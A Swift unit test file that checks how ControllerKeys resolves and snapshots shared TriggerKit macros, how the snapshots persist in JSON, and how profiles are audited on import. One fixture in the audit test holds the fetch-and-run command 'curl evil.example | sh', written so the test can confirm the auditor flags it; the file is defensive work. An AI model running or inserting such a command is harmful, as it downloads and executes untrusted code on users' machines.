import XCTest
import CoreGraphics
import TriggerKitCore
import TriggerKitLibrary
@testable import ControllerKeys

/// Covers the shared TriggerKit macro library wiring: binding resolution
/// (profile macro > live library macro > profile snapshot), snapshot
/// maintenance on profile save, profile persistence, and the import safety
/// audit of snapshot programs.
@MainActor
final class SharedMacroStoreWiringTests: XCTestCase {

    private var store: AutomationMacroStore!
    private var storeFileURL: URL!
    private var profileManager: ProfileManager!
    private var testConfigDirectory: URL!
    private var mockInputSimulator: MockInputSimulator!
    private var factory: ActionCommandFactory!

    override func setUp() async throws {
        try await super.setUp()
        storeFileURL = FileManager.default.temporaryDirectory
            .appendingPathComponent("triggerkit-tests-\(UUID().uuidString)", isDirectory: true)
            .appendingPathComponent("macros.json")
        store = AutomationMacroStore(
            fileURL: storeFileURL,
            notificationCenter: NotificationCenter(),
            distributedNotificationCenter: nil
        )
        testConfigDirectory = FileManager.default.temporaryDirectory
            .appendingPathComponent("controllerkeys-tests-\(UUID().uuidString)", isDirectory: true)
        profileManager = ProfileManager(configDirectoryOverride: testConfigDirectory, sharedMacroStore: store)
        mockInputSimulator = MockInputSimulator()

        let systemCommandExecutor = SystemCommandExecutor(profileManager: profileManager)
        factory = ActionCommandFactory(
            inputSimulator: mockInputSimulator,
            inputQueue: DispatchQueue(label: "test.input"),
            macroExecutor: MacroExecutor(
                inputSimulator: mockInputSimulator,
                systemCommandExecutor: systemCommandExecutor
            ),
            systemCommandExecutor: systemCommandExecutor,
            scriptEngine: nil,
            sharedMacroStore: store
        )
    }

    override func tearDown() async throws {
        factory = nil
        mockInputSimulator = nil
        profileManager = nil
        store = nil
        if let testConfigDirectory {
            try? FileManager.default.removeItem(at: testConfigDirectory)
        }
        if let storeFileURL {
            try? FileManager.default.removeItem(at: storeFileURL.deletingLastPathComponent())
        }
        testConfigDirectory = nil
        storeFileURL = nil
        try await super.tearDown()
    }

    private func waitUntil(
        timeout: TimeInterval = 3.0,
        _ condition: @escaping () -> Bool
    ) async -> Bool {
        let deadline = Date().addingTimeInterval(timeout)
        while Date() < deadline {
            if condition() { return true }
            try? await Task.sleep(nanoseconds: 10_000_000)
        }
        return condition()
    }

    private func keyPressProgram(name: String, keyCode: UInt16) -> AutomationProgram {
        AutomationProgram(name: name, steps: [
            .keyPress(KeyStroke(key: TriggerKey(id: "k\(keyCode)", keyCode: keyCode, displayName: "K\(keyCode)")))
        ])
    }

    // MARK: - Resolution

    func testProfileMacroWinsOverSharedLibraryMacroWithSameId() async {
        let macroId = UUID()
        store.upsert(AutomationMacro(
            id: macroId,
            name: "Shared",
            program: keyPressProgram(name: "Shared", keyCode: 9)
        ))
        let profile = Profile(name: "P", macros: [
            Macro(id: macroId, name: "ProfileMacro", steps: [.press(KeyMapping(keyCode: 1))])
        ])

        let command = factory.makeCommand(for: KeyMapping(macroId: macroId), profile: profile)
        let feedback = command.execute()

        XCTAssertEqual(feedback, "ProfileMacro")
        let completed = await waitUntil { self.mockInputSimulator.events.count >= 1 }
        XCTAssertTrue(completed)
        XCTAssertEqual(mockInputSimulator.events, [.pressKey(1, [])], "Profile macro should run, not the shared one")
    }

    func testSharedLibraryMacroExecutesWhenNotInProfile() async {
        let macro = AutomationMacro(name: "Library Macro", program: keyPressProgram(name: "Library Macro", keyCode: 5))
        store.upsert(macro)
        let profile = Profile(name: "P")

        let command = factory.makeCommand(for: KeyMapping(macroId: macro.id), profile: profile)
        let feedback = command.execute()

        XCTAssertEqual(feedback, "Library Macro")
        let completed = await waitUntil { self.mockInputSimulator.events.count >= 1 }
        XCTAssertTrue(completed)
        XCTAssertEqual(mockInputSimulator.events, [.pressKey(5, [])])
    }

    func testDeletedLibraryMacroFallsBackToProfileSnapshot() async {
        let macroId = UUID()
        var profile = Profile(name: "P")
        profile.sharedMacroSnapshots[macroId] = keyPressProgram(name: "Snapshot", keyCode: 7)

        let command = factory.makeCommand(for: KeyMapping(macroId: macroId), profile: profile)
        let feedback = command.execute()

        XCTAssertEqual(feedback, "Snapshot")
        let completed = await waitUntil { self.mockInputSimulator.events.count >= 1 }
        XCTAssertTrue(completed)
        XCTAssertEqual(mockInputSimulator.events, [.pressKey(7, [])])
    }

    func testEmptyLiveLibraryMacroIntentionallyDoesNothing() async {
        // The TriggerKit consumer rule: a live macro with no steps means "do
        // nothing" — the snapshot must NOT resurrect old behavior.
        let macroId = UUID()
        store.upsert(AutomationMacro(id: macroId, name: "Emptied", program: AutomationProgram(name: "Emptied")))
        var profile = Profile(name: "P")
        profile.sharedMacroSnapshots[macroId] = keyPressProgram(name: "Old Snapshot", keyCode: 7)

        let command = factory.makeCommand(for: KeyMapping(macroId: macroId), profile: profile)
        _ = command.execute()

        try? await Task.sleep(nanoseconds: 200_000_000)
        XCTAssertTrue(mockInputSimulator.events.isEmpty, "Empty live macro should not run the stale snapshot")
    }

    func testUnresolvableMacroReferenceNoOps() async {
        let command = factory.makeCommand(for: KeyMapping(macroId: UUID()), profile: Profile(name: "P"))
        let feedback = command.execute()

        XCTAssertEqual(feedback, "Macro")
        try? await Task.sleep(nanoseconds: 100_000_000)
        XCTAssertTrue(mockInputSimulator.events.isEmpty)
    }

    // MARK: - Snapshot sync policy

    func testReferencedSharedMacroIdsCoverAllBindingSurfaces() {
        let buttonId = UUID()
        let longHoldId = UUID()
        let chordId = UUID()
        let sequenceId = UUID()
        let gestureId = UUID()
        let wheelId = UUID()
        let layerId = UUID()
        let profileMacro = Macro(name: "Own", steps: [.delay(0.1)])

        var profile = Profile(name: "P", macros: [profileMacro])
        profile.buttonMappings[.a] = KeyMapping(
            longHoldMapping: LongHoldMapping(macroId: longHoldId),
            macroId: buttonId
        )
        profile.chordMappings = [ChordMapping(buttons: [.a, .b], macroId: chordId)]
        profile.sequenceMappings = [SequenceMapping(steps: [.a, .b], macroId: sequenceId)]
        profile.gestureMappings = [GestureMapping(gestureType: .tiltForward, macroId: gestureId)]
        profile.commandWheelActions = [CommandWheelAction(displayName: "W", macroId: wheelId)]
        profile.layers = [Layer(name: "L", activatorButton: .leftBumper, buttonMappings: [.b: KeyMapping(macroId: layerId)])]
        profile.buttonMappings[.x] = KeyMapping(macroId: profileMacro.id)

        let referenced = SharedMacroSnapshotPolicy.referencedSharedMacroIds(in: profile)

        XCTAssertEqual(
            referenced,
            [buttonId, longHoldId, chordId, sequenceId, gestureId, wheelId, layerId],
            "Every binding surface should be collected; profile macro IDs excluded"
        )
    }

    func testSyncedSnapshotsRefreshKeepAndDrop() {
        let liveId = UUID()
        let deletedId = UUID()
        let unreferencedId = UUID()
        store.upsert(AutomationMacro(id: liveId, name: "Live", program: keyPressProgram(name: "Live", keyCode: 3)))

        var profile = Profile(name: "P")
        profile.buttonMappings[.a] = KeyMapping(macroId: liveId)
        profile.buttonMappings[.b] = KeyMapping(macroId: deletedId)
        profile.sharedMacroSnapshots = [
            liveId: keyPressProgram(name: "Stale Live", keyCode: 1),
            deletedId: keyPressProgram(name: "Deleted Snapshot", keyCode: 2),
            unreferencedId: keyPressProgram(name: "Orphan", keyCode: 9)
        ]

        let synced = SharedMacroSnapshotPolicy.syncedSnapshots(for: profile, store: store)

        XCTAssertEqual(synced[liveId]?.name, "Live", "Live library macro should refresh the snapshot")
        XCTAssertEqual(synced[deletedId]?.name, "Deleted Snapshot", "Deleted macro keeps its last snapshot")
        XCTAssertNil(synced[unreferencedId], "Snapshots without any binding are dropped")
    }

    func testUpdateProfileSyncsSnapshots() {
        let macro = AutomationMacro(name: "Lib", program: keyPressProgram(name: "Lib", keyCode: 4))
        store.upsert(macro)

        var profile = Profile(name: "P")
        profileManager.installTestProfile(profile)
        profile.buttonMappings[.a] = KeyMapping(macroId: macro.id)
        profileManager.updateProfile(profile)

        XCTAssertEqual(
            profileManager.activeProfile?.sharedMacroSnapshots[macro.id]?.name, "Lib",
            "Assignment + save should embed a snapshot of the shared macro"
        )

        // Deleting the library macro keeps the snapshot on the next save.
        store.remove(id: macro.id)
        profileManager.updateProfile(profileManager.activeProfile!)
        XCTAssertEqual(profileManager.activeProfile?.sharedMacroSnapshots[macro.id]?.name, "Lib")

        // Removing the binding drops the snapshot on the next save.
        var unbound = profileManager.activeProfile!
        unbound.buttonMappings.removeValue(forKey: .a)
        profileManager.updateProfile(unbound)
        XCTAssertNil(profileManager.activeProfile?.sharedMacroSnapshots[macro.id])
    }

    // MARK: - Profile persistence

    func testSharedMacroSnapshotsRoundTripThroughJSON() throws {
        var profile = Profile(name: "P")
        let macroId = UUID()
        profile.buttonMappings[.a] = KeyMapping(macroId: macroId)
        profile.sharedMacroSnapshots[macroId] = keyPressProgram(name: "Snap", keyCode: 11)

        let data = try JSONEncoder().encode(profile)
        let decoded = try JSONDecoder().decode(Profile.self, from: data)

        XCTAssertEqual(decoded.sharedMacroSnapshots, profile.sharedMacroSnapshots)

        let json = String(data: data, encoding: .utf8) ?? ""
        XCTAssertTrue(json.contains(macroId.uuidString), "Snapshots should encode as a string-keyed object")
    }

    func testProfileWithoutSnapshotsFieldDecodesToEmpty() throws {
        let json = #"{"id":"11111111-1111-1111-1111-111111111111","name":"Legacy"}"#
        let decoded = try JSONDecoder().decode(Profile.self, from: Data(json.utf8))

        XCTAssertTrue(decoded.sharedMacroSnapshots.isEmpty)
    }

    /// A forward-versioned (unsupported-schema) snapshot must be dropped, not
    /// throw — otherwise one bad entry from a newer build would unwind the whole
    /// profile array on a downgrade and every profile would vanish. The valid
    /// sibling entry, and the profile itself, must still decode.
    func testForwardVersionedSnapshotIsDroppedWithoutSinkingTheProfile() throws {
        let goodId = "AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA"
        let futureId = "BBBBBBBB-BBBB-BBBB-BBBB-BBBBBBBBBBBB"
        let json = """
        {
            "id": "11111111-1111-1111-1111-111111111111",
            "name": "Mixed",
            "sharedMacroSnapshots": {
                "\(goodId)": { "name": "Good", "steps": [] },
                "\(futureId)": { "schemaVersion": 999, "name": "FromTheFuture", "steps": [] }
            }
        }
        """

        let decoded = try JSONDecoder().decode(Profile.self, from: Data(json.utf8))

        XCTAssertEqual(decoded.name, "Mixed", "Profile must survive a poison snapshot.")
        XCTAssertEqual(decoded.sharedMacroSnapshots.count, 1)
        XCTAssertEqual(decoded.sharedMacroSnapshots[UUID(uuidString: goodId)!]?.name, "Good")
        XCTAssertNil(decoded.sharedMacroSnapshots[UUID(uuidString: futureId)!],
                     "The unsupported-schema snapshot must be dropped.")
    }

    func testEmptySnapshotsAreOmittedFromEncodedJSON() throws {
        let data = try JSONEncoder().encode(Profile(name: "P"))
        let json = String(data: data, encoding: .utf8) ?? ""

        XCTAssertFalse(json.contains("sharedMacroSnapshots"))
    }

    // MARK: - Import safety audit

    func testAuditorFlagsShellStepsInsideSharedMacroSnapshots() {
        var profile = Profile(name: "P")
        let macroId = UUID()
        profile.buttonMappings[.a] = KeyMapping(macroId: macroId)
        profile.sharedMacroSnapshots[macroId] = AutomationProgram(name: "Sneaky", steps: [
            .delay(DelayStep(seconds: 1)),
            .shellCommand(ShellCommandStep(command: "curl evil.example | sh", runsInTerminal: true))
        ])

        let report = ProfileImportSafetyAuditor.audit(profile)

        XCTAssertTrue(report.requiresUserConfirmation)
        XCTAssertEqual(report.shellCommands.count, 1)
        XCTAssertEqual(report.shellCommands.first?.command, "curl evil.example | sh")
        XCTAssertTrue(report.shellCommands.first?.inTerminal ?? false)
        XCTAssertTrue(report.shellCommands.first?.context.contains("Sneaky") ?? false)
    }

    func testAuditorIgnoresNonShellSnapshotSteps() {
        var profile = Profile(name: "P")
        profile.sharedMacroSnapshots[UUID()] = AutomationProgram(name: "Benign", steps: [
            .keyPress(KeyStroke(key: .return)),
            .webhook(WebhookStep(url: "https://example.com")),
            .custom(CustomStep(namespace: "controllerkeys.obs-websocket"))
        ])

        let report = ProfileImportSafetyAuditor.audit(profile)

        XCTAssertFalse(report.requiresUserConfirmation)
    }
}
